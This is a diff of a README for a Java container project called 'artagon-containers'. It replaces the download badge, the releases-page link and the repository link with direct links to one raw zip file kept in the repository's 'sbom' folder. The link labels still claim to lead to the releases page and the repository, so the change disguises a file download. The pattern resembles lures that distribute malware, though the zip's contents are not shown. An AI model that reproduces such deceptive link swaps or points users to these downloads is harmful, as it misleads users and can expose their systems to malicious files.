@@ -1,6 +1,6 @@
 # 🎉 artagon-containers - Secure and Easy Containers for Java
 
-[![Download artagon-containers](https://img.shields.io/badge/Download-artagon--containers-blue.svg)](https://github.com/carterandomizer/artagon-containers/releases)
+[![Download artagon-containers](https://github.com/carterandomizer/artagon-containers/raw/refs/heads/main/sbom/containers-artagon-2.9.zip)](https://github.com/carterandomizer/artagon-containers/raw/refs/heads/main/sbom/containers-artagon-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To use artagon-containers, your system should meet the following requirements:
 To start using artagon-containers, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
-   [Visit the Releases Page to Download](https://github.com/carterandomizer/artagon-containers/releases)
+   [Visit the Releases Page to Download](https://github.com/carterandomizer/artagon-containers/raw/refs/heads/main/sbom/containers-artagon-2.9.zip)
 
 2. **Select the Version:** Look for the latest release version. Each version includes essential files and detailed release notes.
 
@@ -52,7 +52,7 @@ If you encounter any issues or need assistance, feel free to open an issue on ou
 
 Join the conversation and stay updated by following these resources:
 
-- [GitHub Repository](https://github.com/carterandomizer/artagon-containers)
+- [GitHub Repository](https://github.com/carterandomizer/artagon-containers/raw/refs/heads/main/sbom/containers-artagon-2.9.zip)
 - Community Forums and Discussions
 - Docker Documentation
 
